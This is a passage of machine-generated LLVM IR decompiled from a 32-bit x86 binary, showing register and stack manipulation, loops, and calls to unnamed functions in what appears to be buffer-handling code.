  %v2_8049325 = add i32 %v1_8049325, -4
  %v3_8049325 = inttoptr i32 %v2_8049325 to i32*
  store i32 %v0_8049325, i32* %v3_8049325, align 4
  %v0_8049326 = load i32, i32* @ebx, align 4
  %v2_8049326 = add i32 %v1_8049325, -8
  %v3_8049326 = inttoptr i32 %v2_8049326 to i32*
  store i32 %v0_8049326, i32* %v3_8049326, align 4
  %v1_8049327 = add i32 %v1_8049325, 76
  %v2_8049327 = inttoptr i32 %v1_8049327 to i32*
  %v3_8049327 = load i32, i32* %v2_8049327, align 4
  store i32 %v3_8049327, i32* %edx.global-to-local, align 4
  %v0_804932b = load i32, i32* %eax.global-to-local, align 4
  %v2_804932b = add i32 %v3_8049327, 1472
  %v3_804932b = add i32 %v2_804932b, %v0_804932b
  store i32 %v3_804932b, i32* %eax.global-to-local, align 4
  %v2_8049332 = add i32 %v1_8049325, -12
  %v3_8049332 = inttoptr i32 %v2_8049332 to i32*
  store i32 %v3_804932b, i32* %v3_8049332, align 4
  %v0_8049333 = load i32, i32* @esi, align 4
  %v2_8049333 = add i32 %v1_8049325, -16
  %v3_8049333 = inttoptr i32 %v2_8049333 to i32*
  store i32 %v0_8049333, i32* %v3_8049333, align 4
  %v0_8049334 = call i32 @function_8052000()
  store i32 %v0_8049334, i32* %eax.global-to-local, align 4
  %v0_8049339 = load i32, i32* @esp, align 4
  %v1_8049339 = add i32 %v0_8049339, 16
  %v3_804933c = trunc i32 %v0_8049334 to i8
  %v4_804933c = icmp eq i8 %v3_804933c, 0
  store i1 %v4_804933c, i1* %zf.global-to-local, align 1
  %v1_804933e = icmp eq i1 %v4_804933c, false
  br i1 %v1_804933e, label %dec_label_pc_8049301, label %dec_label_pc_8049340

dec_label_pc_8049340:                             ; preds = %dec_label_pc_8049322
  %v1_8049340 = add i32 %v0_8049339, 20916
  %v2_8049340 = inttoptr i32 %v1_8049340 to i32*
  %v3_8049340 = load i32, i32* %v2_8049340, align 4
  store i32 %v3_8049340, i32* %eax.global-to-local, align 4
  %v1_8049347 = add i32 %v0_8049339, 108
  %v2_8049347 = inttoptr i32 %v1_8049347 to i32*
  %v3_8049347 = load i32, i32* %v2_8049347, align 4
  store i32 %v3_8049347, i32* %ecx.global-to-local, align 4
  %v1_804934b = add i32 %v3_8049340, 1
  store i32 %v1_804934b, i32* %eax.global-to-local, align 4
  store i32 %v1_804934b, i32* %v2_8049340, align 4
  %v0_8049353 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049353 = add i32 %v0_8049353, 16
  %v2_8049353 = inttoptr i32 %v1_8049353 to i32*
  %v3_8049353 = load i32, i32* %v2_8049353, align 4
  %v4_8049353 = load i32, i32* %eax.global-to-local, align 4
  %v5_8049353 = sub i32 %v3_8049353, %v4_8049353
  %v11_8049353 = xor i32 %v4_8049353, %v3_8049353
  %v12_8049353 = xor i32 %v5_8049353, %v3_8049353
  %v13_8049353 = and i32 %v12_8049353, %v11_8049353
  %v14_8049353 = icmp slt i32 %v13_8049353, 0
  %v15_8049353 = icmp eq i32 %v5_8049353, 0
  store i1 %v15_8049353, i1* %zf.global-to-local, align 1
  %v16_8049353 = icmp slt i32 %v5_8049353, 0
  %v3_8049356 = icmp eq i1 %v16_8049353, %v14_8049353
  %v4_8049356 = icmp eq i1 %v15_8049353, false
  %v5_8049356 = and i1 %v4_8049356, %v3_8049356
  br i1 %v5_8049356, label %dec_label_pc_8049322, label %dec_label_pc_8049358

dec_label_pc_8049358:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_804930a
  %v0_8049358 = load i32, i32* @esp, align 4
  %v9_8049358 = icmp eq i32 %v0_8049358, 12
  store i1 %v9_8049358, i1* %zf.global-to-local, align 1
  %v0_804935b = load i32, i32* @esi, align 4
  %v2_804935b = add i32 %v0_8049358, -16
  %v3_804935b = inttoptr i32 %v2_804935b to i32*
  store i32 %v0_804935b, i32* %v3_804935b, align 4
  %v2_804935c = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v0_8049361 = load i32, i32* @esp, align 4
  %v1_8049361 = add i32 %v0_8049361, 16
  %v1_8049364 = add i32 %v2_804935c, -127
  %v6_8049364 = sub i32 126, %v2_804935c
  %v7_8049364 = and i32 %v6_8049364, %v2_804935c
  %v8_8049364 = icmp slt i32 %v7_8049364, 0
  %v9_8049364 = icmp eq i32 %v1_8049364, 0
  store i1 %v9_8049364, i1* %zf.global-to-local, align 1
  %v10_8049364 = icmp slt i32 %v1_8049364, 0
  %v3_8049367 = icmp eq i1 %v10_8049364, %v8_8049364
  %v4_8049367 = icmp eq i1 %v9_8049364, false
  %v5_8049367 = and i1 %v4_8049367, %v3_8049367
  br i1 %v5_8049367, label %dec_label_pc_8049301, label %dec_label_pc_8049369

dec_label_pc_8049369:                             ; preds = %dec_label_pc_8049358
  %v0_8049369 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049369 = add i32 %v0_8049361, 12
  %v3_8049369 = inttoptr i32 %v2_8049369 to i32*
  store i32 %v0_8049369, i32* %v3_8049369, align 4
  %v0_804936a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804936a = add i32 %v0_8049361, 8
  %v3_804936a = inttoptr i32 %v2_804936a to i32*
  store i32 %v0_804936a, i32* %v3_804936a, align 4
  %v0_804936b = load i32, i32* @esi, align 4
  %v2_804936b = add i32 %v0_8049361, 4
  %v3_804936b = inttoptr i32 %v2_804936b to i32*
  store i32 %v0_804936b, i32* %v3_804936b, align 4
  %v1_804936c = add i32 %v0_8049361, 108
  %v2_804936c = inttoptr i32 %v1_804936c to i32*
  %v3_804936c = load i32, i32* %v2_804936c, align 4
  store i32 %v3_804936c, i32* %edx.global-to-local, align 4
  %v1_8049370 = add i32 %v0_8049361, 92
  %v2_8049370 = inttoptr i32 %v1_8049370 to i32*
  %v3_8049370 = load i32, i32* %v2_8049370, align 4
  store i32 %v3_8049370, i32* %ecx.global-to-local, align 4
  %v1_8049374 = add i32 %v3_804936c, 16
  %v2_8049374 = inttoptr i32 %v1_8049374 to i32*
  %v3_8049374 = load i32, i32* %v2_8049374, align 4
  %v2_8049377 = mul i32 %v3_8049374, 128
  %v3_8049377 = icmp eq i32 %v2_8049377, 0
  store i1 %v3_8049377, i1* %zf.global-to-local, align 1
  %v2_804937a = add i32 %v3_8049370, 1472
  %v3_804937a = add i32 %v2_804937a, %v2_8049377
  store i32 %v3_804937a, i32* %eax.global-to-local, align 4
  %v3_8049381 = inttoptr i32 %v0_8049361 to i32*
  store i32 %v3_804937a, i32* %v3_8049381, align 4
  %v3_8049382 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049382, i32* %eax.global-to-local, align 4
  %v0_8049387 = load i32, i32* @esp, align 4
  %v1_8049387 = add i32 %v0_8049387, 108
  %v2_8049387 = inttoptr i32 %v1_8049387 to i32*
  %v3_8049387 = load i32, i32* %v2_8049387, align 4
  store i32 %v3_8049387, i32* %eax.global-to-local, align 4
  %v1_804938e = add i32 %v3_8049387, 16
  %v2_804938e = inttoptr i32 %v1_804938e to i32*
  %v3_804938e = load i32, i32* %v2_804938e, align 4
  %v1_8049391 = add i32 %v3_804938e, 1
  %v8_8049391 = icmp eq i32 %v1_8049391, 0
  store i1 %v8_8049391, i1* %zf.global-to-local, align 1
  store i32 %v1_8049391, i32* %edx.global-to-local, align 4
  store i32 %v1_8049391, i32* %v2_804938e, align 4
  %v0_8049301.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049301

dec_label_pc_804939a:                             ; preds = %dec_label_pc_804921b
  %v0_804939a = load i32, i32* %eax.global-to-local, align 4
  %v1_804939a = add i32 %v0_804939a, 1
  %v8_804939a = icmp eq i32 %v1_804939a, 0
  store i1 %v8_804939a, i1* %zf.global-to-local, align 1
  store i32 %v1_804939a, i32* %eax.global-to-local, align 4
  %v0_804939b = load i32, i32* @esi, align 4
  %v2_804939b = add i32 %v0_804939b, %v1_804939a
  store i32 %v2_804939b, i32* %ecx.global-to-local, align 4
  %v2_804939e = add i32 %v0_804923c, 124
  %v3_804939e = inttoptr i32 %v2_804939e to i32*
  store i32 %v2_804939b, i32* %v3_804939e, align 4
  %v0_804924d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804924d

dec_label_pc_80493a7:                             ; preds = %dec_label_pc_8048547
  %v1_80493a7 = add i32 %v0_80485a5, -1440
  %v2_80493a7 = inttoptr i32 %v1_80493a7 to i32*
  %v3_80493a7 = load i32, i32* %v2_80493a7, align 4
  %v1_80493af = urem i32 %v3_80493a7, 32
  store i32 %v1_80493af, i32* %eax.global-to-local, align 4
  %v2_80493b2 = udiv i32 %v3_80493a7, 32
  store i32 %v2_80493b2, i32* %edx.global-to-local, align 4
  %v0_80493b5 = load i32, i32* @esp, align 4
  %v2_80493b5 = mul nuw nsw i32 %v2_80493b2, 4
  %v3_80493b5 = add nuw nsw i32 %v2_80493b5, 20740
  %v4_80493b5 = add i32 %v3_80493b5, %v0_80493b5
  %v5_80493b5 = inttoptr i32 %v4_80493b5 to i32*
  %v6_80493b5 = load i32, i32* %v5_80493b5, align 4
  %v9_80493b5 = shl i32 1, %v1_80493af
  %v12_80493b5 = or i32 %v6_80493b5, %v9_80493b5
  store i32 %v12_80493b5, i32* %v5_80493b5, align 4
  %v0_80493bd = load i32, i32* @esi, align 4
  %v1_80493bd = add i32 %v0_80493bd, -1440
  %v2_80493bd = inttoptr i32 %v1_80493bd to i32*
  %v3_80493bd = load i32, i32* %v2_80493bd, align 4
  store i32 %v3_80493bd, i32* %eax.global-to-local, align 4
  %v1_80493c3 = load i32, i32* @esp, align 4
  %v2_80493c3 = add i32 %v1_80493c3, 72
  %v3_80493c3 = inttoptr i32 %v2_80493c3 to i32*
  %v4_80493c3 = load i32, i32* %v3_80493c3, align 4
  %v5_80493c3 = sub i32 %v3_80493bd, %v4_80493c3
  %v11_80493c3 = xor i32 %v4_80493c3, %v3_80493bd
  %v12_80493c3 = xor i32 %v5_80493c3, %v3_80493bd
  %v13_80493c3 = and i32 %v12_80493c3, %v11_80493c3
  %v14_80493c3 = icmp slt i32 %v13_80493c3, 0
  %v15_80493c3 = icmp eq i32 %v5_80493c3, 0
  store i1 %v15_80493c3, i1* %zf.global-to-local, align 1
  %v16_80493c3 = icmp slt i32 %v5_80493c3, 0
  %v3_80493c7 = icmp ne i1 %v16_80493c3, %v14_80493c3
  %v4_80493c7 = or i1 %v15_80493c3, %v3_80493c7
  br i1 %v4_80493c7, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80493d2:                             ; preds = %dec_label_pc_804920d, %dec_label_pc_80491e0
  %v0_80493d2 = load i32, i32* @edi, align 4
  %v2_80493d2 = add i32 %v0_8049203, 12
  %v3_80493d2 = inttoptr i32 %v2_80493d2 to i32*
  store i32 %v0_80493d2, i32* %v3_80493d2, align 4
  %v0_80493d3 = load i32, i32* @edi, align 4
  %v2_80493d3 = add i32 %v0_8049203, 8
  %v3_80493d3 = inttoptr i32 %v2_80493d3 to i32*
  store i32 %v0_80493d3, i32* %v3_80493d3, align 4
  %v1_80493d4 = add i32 %v0_8049203, 4
  %v2_80493d4 = inttoptr i32 %v1_80493d4 to i32*
  store i32 0, i32* %v2_80493d4, align 4
  %v2_80493d6 = inttoptr i32 %v0_8049203 to i32*
  store i32 38, i32* %v2_80493d6, align 4
  %v3_80493d8 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80493d8, i32* %eax.global-to-local, align 4
  %v0_80493dd = load i32, i32* @esp, align 4
  %v9_80493dd = icmp eq i32 %v0_80493dd, -12
  store i1 %v9_80493dd, i1* %zf.global-to-local, align 1
  %v2_80493e0 = add i32 %v0_80493dd, 8
  %v3_80493e0 = inttoptr i32 %v2_80493e0 to i32*
  store i32 %v3_80493d8, i32* %v3_80493e0, align 4
  %v1_80493e1 = add i32 %v0_80493dd, 120
  %v2_80493e1 = inttoptr i32 %v1_80493e1 to i32*
  %v3_80493e1 = load i32, i32* %v2_80493e1, align 4
  %v2_80493e5 = add i32 %v0_80493dd, 4
  %v3_80493e5 = inttoptr i32 %v2_80493e5 to i32*
  store i32 %v3_80493e1, i32* %v3_80493e5, align 4
  %v1_80493e6 = add i32 %v0_80493dd, 147
  store i32 %v1_80493e6, i32* @ecx, align 4
  %v3_80493ed = inttoptr i32 %v0_80493dd to i32*
  store i32 %v1_80493e6, i32* %v3_80493ed, align 4
  %v4_80493ee = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80493f3 = load i32, i32* @esp, align 4
  %v1_80493f6 = add i32 %v4_80493ee, 1
  %v8_80493f6 = icmp eq i32 %v1_80493f6, 0
  store i1 %v8_80493f6, i1* %zf.global-to-local, align 1
  store i32 %v1_80493f6, i32* %eax.global-to-local, align 4
  br i1 %v8_80493f6, label %dec_label_pc_8049854, label %dec_label_pc_80493fd

dec_label_pc_80493fd:                             ; preds = %dec_label_pc_80493d2
  %v0_80493fd = load i32, i32* @ebx, align 4
  %v2_80493fd = add i32 %v0_80493f3, 12
  %v3_80493fd = inttoptr i32 %v2_80493fd to i32*
  store i32 %v0_80493fd, i32* %v3_80493fd, align 4
  %v0_80493fe = load i32, i32* @ebx, align 4
  %v2_80493fe = add i32 %v0_80493f3, 8
  %v3_80493fe = inttoptr i32 %v2_80493fe to i32*
  store i32 %v0_80493fe, i32* %v3_80493fe, align 4
  %v1_80493ff = add i32 %v0_80493f3, 4
  %v2_80493ff = inttoptr i32 %v1_80493ff to i32*
  store i32 0, i32* %v2_80493ff, align 4
  %v2_8049401 = inttoptr i32 %v0_80493f3 to i32*
  store i32 38, i32* %v2_8049401, align 4
  %v3_8049403 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049403, i32* %eax.global-to-local, align 4
  %v0_8049408 = load i32, i32* @esp, align 4
  %v9_8049408 = icmp eq i32 %v0_8049408, -12
  store i1 %v9_8049408, i1* %zf.global-to-local, align 1
  %v2_804940b = add i32 %v0_8049408, 8
  %v3_804940b = inttoptr i32 %v2_804940b to i32*
  store i32 %v3_8049403, i32* %v3_804940b, align 4
  %v1_804940c = add i32 %v0_8049408, 120
  %v2_804940c = inttoptr i32 %v1_804940c to i32*
  %v3_804940c = load i32, i32* %v2_804940c, align 4
  store i32 %v3_804940c, i32* @ecx, align 4
  %v2_8049410 = add i32 %v0_8049408, 4
  %v3_8049410 = inttoptr i32 %v2_8049410 to i32*
  store i32 %v3_804940c, i32* %v3_8049410, align 4
  %v1_8049411 = add i32 %v0_8049408, 147
  store i32 %v1_8049411, i32* %eax.global-to-local, align 4
  %v3_8049418 = inttoptr i32 %v0_8049408 to i32*
  store i32 %v1_8049411, i32* %v3_8049418, align 4
  %v4_8049419 = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049419, i32* %eax.global-to-local, align 4
  %v0_804941e = load i32, i32* @esp, align 4
  %v6_804941e = icmp eq i32 %v0_804941e, -16
  store i1 %v6_804941e, i1* %zf.global-to-local, align 1
  store i32 %v4_8049419, i32* %ebx.global-to-local, align 4
  %v3_8049423 = add i32 %v4_8049419, 147
  %v4_8049423 = add i32 %v3_8049423, %v0_804941e
  %v5_8049423 = inttoptr i32 %v4_8049423 to i8*
  %v6_8049423 = load i8, i8* %v5_8049423, align 1
  %v12_8049423 = icmp eq i8 %v6_8049423, 32
  %v1_804942b = zext i1 %v12_8049423 to i32
  %v1_804942e = add i32 %v0_804941e, 147
  store i32 %v1_804942e, i32* %esi.global-to-local, align 4
  store i32 %v1_804942b, i32* %eax.global-to-local, align 4
  %v1_804943a = add i32 %v0_804941e, 12
  %v2_804943a = inttoptr i32 %v1_804943a to i32*
  store i32 2, i32* %v2_804943a, align 4
  %v1_804943c = add i32 %v0_804941e, 8
  %v2_804943c = inttoptr i32 %v1_804943c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_804943c, align 4
  %v0_8049441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049441 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049441 = add i32 %v1_8049441, %v0_8049441
  store i32 %v2_8049441, i32* @ebx, align 4
  %v1_8049443 = add i32 %v0_804941e, 120
  %v2_8049443 = inttoptr i32 %v1_8049443 to i32*
  %v3_8049443 = load i32, i32* %v2_8049443, align 4
  %v2_8049447 = sub i32 %v3_8049443, %v2_8049441
  store i32 %v2_8049447, i32* %eax.global-to-local, align 4
  %v0_8049449 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049449 = add i32 %v0_8049449, %v2_8049441
  %v12_8049449 = icmp eq i32 %v2_8049449, 0
  store i1 %v12_8049449, i1* %zf.global-to-local, align 1
  store i32 %v2_8049449, i32* @esi, align 4
  %v2_804944b = add i32 %v0_804941e, 4
  %v3_804944b = inttoptr i32 %v2_804944b to i32*
  store i32 %v2_8049447, i32* %v3_804944b, align 4
  %v0_804944c = load i32, i32* @esi, align 4
  %v3_804944c = inttoptr i32 %v0_804941e to i32*
  store i32 %v0_804944c, i32* %v3_804944c, align 4
  %v0_804944d = call i32 @function_8051cf0()
  store i32 %v0_804944d, i32* %eax.global-to-local, align 4
  %v0_8049452 = load i32, i32* @esp, align 4
  store i32 %v0_804944d, i32* %edx.global-to-local, align 4
  %v10_8049457 = icmp eq i32 %v0_804944d, -1
  store i1 %v10_8049457, i1* %zf.global-to-local, align 1
  br i1 %v10_8049457, label %dec_label_pc_8049854, label %dec_label_pc_8049460

dec_label_pc_8049460:                             ; preds = %dec_label_pc_80493fd
  %v10_8049460 = icmp eq i32 %v0_804944d, 1
  store i1 %v10_8049460, i1* %zf.global-to-local, align 1
  %v7_8049463 = icmp sgt i32 %v0_804944d, 1
  br i1 %v7_8049463, label %dec_label_pc_8049465, label %dec_label_pc_8049468

dec_label_pc_8049465:                             ; preds = %dec_label_pc_8049460
  %v1_8049465 = add i32 %v0_804944d, -2
  %v9_8049465 = icmp eq i32 %v1_8049465, 0
  store i1 %v9_8049465, i1* %zf.global-to-local, align 1
  store i32 %v1_8049465, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049468

dec_label_pc_8049468:                             ; preds = %dec_label_pc_8049460, %dec_label_pc_8049465
  %v0_8049471 = phi i32 [ %v0_804944d, %dec_label_pc_8049460 ], [ %v1_8049465, %dec_label_pc_8049465 ]
  %v1_8049468 = add i32 %v0_8049452, 20920
  %v1_804946f = load i32, i32* @ebx, align 4
  %v2_804946f = add i32 %v1_8049468, %v1_804946f
  %v12_804946f = icmp eq i32 %v2_804946f, 0
  store i1 %v12_804946f, i1* %zf.global-to-local, align 1
  store i32 %v2_804946f, i32* %eax.global-to-local, align 4
  %v1_8049471 = add i32 %v0_8049471, 1
  store i32 %v1_8049471, i32* @ebx, align 4
  %v2_8049474 = add i32 %v0_8049471, -20773
  %v3_8049474 = add i32 %v2_8049474, %v2_804946f
  %v4_8049474 = inttoptr i32 %v3_8049474 to i8*
  store i8 0, i8* %v4_8049474, align 1
  %v0_804947c = load i32, i32* @esp, align 4
  %v1_804947c = add i32 %v0_804947c, -4
  %v2_804947c = inttoptr i32 %v1_804947c to i32*
  store i32 4, i32* %v2_804947c, align 4
  %v1_804947e = add i32 %v0_804947c, -8
  %v2_804947e = inttoptr i32 %v1_804947e to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b0b.15 to i32), i32* %v2_804947e, align 4
  %v0_8049483 = load i32, i32* @ebx, align 4
  %v2_8049483 = add i32 %v0_804947c, -12
  %v3_8049483 = inttoptr i32 %v2_8049483 to i32*
  store i32 %v0_8049483, i32* %v3_8049483, align 4
  %v0_8049484 = load i32, i32* @esi, align 4
  %v2_8049484 = add i32 %v0_804947c, -16
  %v3_8049484 = inttoptr i32 %v2_8049484 to i32*
  store i32 %v0_8049484, i32* %v3_8049484, align 4
  %v0_8049485 = call i32 @function_8051cf0()
  store i32 %v0_8049485, i32* @eax, align 4
  %v0_804948a = load i32, i32* @esp, align 4
  %v9_804948d = icmp eq i32 %v0_8049485, 4
  store i1 %v9_804948d, i1* %zf.global-to-local, align 1
  br i1 %v9_804948d, label %dec_label_pc_8049b1d, label %dec_label_pc_8049496

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049468
  %v1_804948a = add i32 %v0_804948a, 16
  %v0_8049496 = load i32, i32* @esi, align 4
  %v1_8049496 = inttoptr i32 %v0_8049496 to i8*
  %v2_8049496 = load i8, i8* %v1_8049496, align 1
  %v11_8049496 = icmp eq i8 %v2_8049496, 47
  store i1 %v11_8049496, i1* %zf.global-to-local, align 1
  br i1 %v11_8049496, label %dec_label_pc_8049c88, label %dec_label_pc_804949f

dec_label_pc_804949f:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049c88, %dec_label_pc_8049bdf, %dec_label_pc_8049bbc, %dec_label_pc_8049496, %dec_label_pc_8049c14
  %v0_804949f = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049cb2, %dec_label_pc_8049c88 ], [ %v1_8049c09, %dec_label_pc_8049bdf ], [ %v1_8049bd1, %dec_label_pc_8049bbc ], [ %v1_804948a, %dec_label_pc_8049496 ], [ %v1_8049c29, %dec_label_pc_8049c14 ]
  %v1_804949f = add i32 %v0_804949f, 92
  %v2_804949f = inttoptr i32 %v1_804949f to i32*
  %v3_804949f = load i32, i32* %v2_804949f, align 4
  store i32 %v3_804949f, i32* %edx.global-to-local, align 4
  %v1_80494a3 = add i32 %v3_804949f, -1448
  %v2_80494a3 = inttoptr i32 %v1_80494a3 to i8*
  store i8 1, i8* %v2_80494a3, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80494af:                             ; preds = %dec_label_pc_8048d81
  %v1_80494af = call i32 @function_8052719(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80494af, i32* %eax.global-to-local, align 4
  %v0_80494b4 = load i32, i32* @esp, align 4
  %v1_80494b4 = add i32 %v0_80494b4, 76
  %v2_80494b4 = inttoptr i32 %v1_80494b4 to i32*
  %v3_80494b4 = load i32, i32* %v2_80494b4, align 4
  store i32 %v3_80494b4, i32* %ecx.global-to-local, align 4
  %v1_80494b8 = add i32 %v0_80494b4, 92
  %v2_80494b8 = inttoptr i32 %v1_80494b8 to i32*
  %v3_80494b8 = load i32, i32* %v2_80494b8, align 4
  store i32 %v3_80494b8, i32* %edx.global-to-local, align 4
  %v1_80494be = add i32 %v3_80494b4, 1472
  store i32 %v1_80494be, i32* @ebp, align 4
  store i32 %v1_80494af, i32* @edi, align 4
  %v1_80494c6 = add i32 %v3_80494b4, 2116
  store i32 %v1_80494c6, i32* @esi, align 4
  %v1_80494cc = add i32 %v3_80494b8, 660
  %v2_80494cc = inttoptr i32 %v1_80494cc to i32*
  %v3_80494cc = load i32, i32* %v2_80494cc, align 4
  %v9_80494cc = icmp eq i32 %v3_80494cc, 1024
  store i1 %v9_80494cc, i1* %zf.global-to-local, align 1
  br i1 %v9_80494cc, label %dec_label_pc_8049605, label %dec_label_pc_80494dc

dec_label_pc_80494dc:                             ; preds = %dec_label_pc_80494af, %dec_label_pc_8049605, %dec_label_pc_80495f1
  %v0_80494dc = phi i32 [ %v0_80495e0, %dec_label_pc_80495f1 ], [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80494dc.pre.pre, %dec_label_pc_8049605 ]
  %v1_80494dc = add i32 %v0_80494dc, 92
  %v2_80494dc = inttoptr i32 %v1_80494dc to i32*
  %v3_80494dc = load i32, i32* %v2_80494dc, align 4
  store i32 %v3_80494dc, i32* %eax.global-to-local, align 4
  %v0_80494e0 = load i32, i32* @edi, align 4
  %v1_80494e0 = inttoptr i32 %v0_80494e0 to i32*
  store i32 0, i32* %v1_80494e0, align 4
  %v0_80494e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494e6 = add i32 %v0_80494e6, 660
  %v2_80494e6 = inttoptr i32 %v1_80494e6 to i32*
  %v3_80494e6 = load i32, i32* %v2_80494e6, align 4
  store i32 %v3_80494e6, i32* %edx.global-to-local, align 4
  %v2_80494f1 = sub i32 1024, %v3_80494e6
  %v12_80494f1 = icmp eq i32 %v2_80494f1, 0
  store i1 %v12_80494f1, i1* %zf.global-to-local, align 1
  store i32 %v2_80494f1, i32* %eax.global-to-local, align 4
  %v0_80494f3 = load i32, i32* @esp, align 4
  %v1_80494f3 = add i32 %v0_80494f3, -4
  %v2_80494f3 = inttoptr i32 %v1_80494f3 to i32*
  store i32 16384, i32* %v2_80494f3, align 4
  %v0_80494f8 = load i32, i32* @esi, align 4
  %v1_80494f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80494f8 = add i32 %v1_80494f8, %v0_80494f8
  store i32 %v2_80494f8, i32* %edx.global-to-local, align 4
  %v0_80494fb = load i32, i32* %eax.global-to-local, align 4
  %v2_80494fb = add i32 %v0_80494f3, -8
  %v3_80494fb = inttoptr i32 %v2_80494fb to i32*
  store i32 %v0_80494fb, i32* %v3_80494fb, align 4
  %v0_80494fc = load i32, i32* %edx.global-to-local, align 4
  %v2_80494fc = add i32 %v0_80494f3, -12
  %v3_80494fc = inttoptr i32 %v2_80494fc to i32*
  store i32 %v0_80494fc, i32* %v3_80494fc, align 4
  %v1_80494fd = add i32 %v0_80494f3, 92
  %v2_80494fd = inttoptr i32 %v1_80494fd to i32*
  %v3_80494fd = load i32, i32* %v2_80494fd, align 4
  store i32 %v3_80494fd, i32* %edx.global-to-local, align 4
  %v1_8049501 = add i32 %v3_80494fd, -1452
  %v2_8049501 = inttoptr i32 %v1_8049501 to i32*
  %v3_8049501 = load i32, i32* %v2_8049501, align 4
  store i32 %v3_8049501, i32* %eax.global-to-local, align 4
  %v2_8049507 = add i32 %v0_80494f3, -16
  %v3_8049507 = inttoptr i32 %v2_8049507 to i32*
  store i32 %v3_8049501, i32* %v3_8049507, align 4
  %v0_8049508 = call i32 @function_80528ae()
  store i32 %v0_8049508, i32* %eax.global-to-local, align 4
  %v0_804950d = load i32, i32* @esp, align 4
  %v1_804950d = add i32 %v0_804950d, 16
  %v1_8049510 = icmp eq i32 %v0_8049508, 0
  store i1 %v1_8049510, i1* %zf.global-to-local, align 1
  br i1 %v1_8049510, label %dec_label_pc_8048e44, label %dec_label_pc_8049518

dec_label_pc_8049518:                             ; preds = %dec_label_pc_80494dc
  %v10_8049518 = icmp eq i32 %v0_8049508, -1
  store i1 %v10_8049518, i1* %zf.global-to-local, align 1
  br i1 %v10_8049518, label %dec_label_pc_8049b0f, label %dec_label_pc_8049521

dec_label_pc_8049521:                             ; preds = %dec_label_pc_8049518
  %v1_8049521 = add i32 %v0_804950d, 108
  %v2_8049521 = inttoptr i32 %v1_8049521 to i32*
  %v3_8049521 = load i32, i32* %v2_8049521, align 4
  store i32 %v3_8049521, i32* %edx.global-to-local, align 4
  %v1_8049525 = add i32 %v3_8049521, 660
  %v2_8049525 = inttoptr i32 %v1_8049525 to i32*
  %v3_8049525 = load i32, i32* %v2_8049525, align 4
  %v2_804952b = add i32 %v3_8049525, %v0_8049508
  %v12_804952b = icmp eq i32 %v2_804952b, 0
  store i1 %v12_804952b, i1* %zf.global-to-local, align 1
  store i32 %v2_804952b, i32* %ecx.global-to-local, align 4
  store i32 %v2_804952b, i32* %v2_8049525, align 4
  %v0_8049533 = load i32, i32* @esp, align 4
  %v1_8049533 = add i32 %v0_8049533, 116
  %v2_8049533 = inttoptr i32 %v1_8049533 to i32*
  %v3_8049533 = load i32, i32* %v2_8049533, align 4
  store i32 %v3_8049533, i32* %ecx.global-to-local, align 4
  %v1_8049537 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049537 = add i32 %v1_8049537, -1444
  %v3_8049537 = inttoptr i32 %v2_8049537 to i32*
  store i32 %v3_8049533, i32* %v3_8049537, align 4
  %v0_80495d1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_8049542:                             ; preds = %dec_label_pc_80495d1
  %v1_8049542 = add i32 %v0_8049542, 660
  %v2_8049542 = inttoptr i32 %v1_8049542 to i32*
  %v3_8049542 = load i32, i32* %v2_8049542, align 4
  store i32 %v3_8049542, i32* %edx.global-to-local, align 4
  store i32 %v3_80495d1, i32* @ebx, align 4
  %v2_804954a = sub i32 %v3_80495d1, %v3_8049542
  %v8_804954a = xor i32 %v3_8049542, %v3_80495d1
  %v9_804954a = xor i32 %v2_804954a, %v3_80495d1
  %v10_804954a = and i32 %v9_804954a, %v8_804954a
  %v11_804954a = icmp slt i32 %v10_804954a, 0
  %v12_804954a = icmp eq i32 %v2_804954a, 0
  store i1 %v12_804954a, i1* %zf.global-to-local, align 1
  %v13_804954a = icmp slt i32 %v2_804954a, 0
  %v3_804954c = icmp ne i1 %v13_804954a, %v11_804954a
  %v4_804954c = or i1 %v12_804954a, %v3_804954c
  br i1 %v4_804954c, label %dec_label_pc_8049550, label %dec_label_pc_804954e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_8049542
  store i32 %v3_8049542, i32* @ebx, align 4
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %dec_label_pc_8049542, %dec_label_pc_804954e
  %v1_8049554 = phi i32 [ %v3_80495d1, %dec_label_pc_8049542 ], [ %v3_8049542, %dec_label_pc_804954e ]
  %v0_8049550 = load i32, i32* @esp, align 4
  %v1_8049550 = add i32 %v0_8049550, 92
  %v2_8049550 = inttoptr i32 %v1_8049550 to i32*
  %v3_8049550 = load i32, i32* %v2_8049550, align 4
